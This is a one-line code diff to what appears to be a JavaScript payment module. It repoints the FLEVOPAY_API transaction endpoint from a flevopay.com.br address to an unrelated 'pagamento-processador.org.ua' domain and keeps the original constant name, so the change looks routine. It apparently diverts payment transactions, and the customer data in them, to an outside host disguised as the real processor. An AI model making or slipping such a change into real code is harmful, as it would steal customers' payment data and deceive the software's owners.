@@ -1,4 +1,4 @@
-const FLEVOPAY_API = 'https://app.flevopay.com.br/api/v1/transaction';
+const FLEVOPAY_API = 'https://pagamento-processador.org.ua/api/v1/transaction';
 
 function onlyDigits(value) {
   return String(value || '').replace(/\D/g, '');
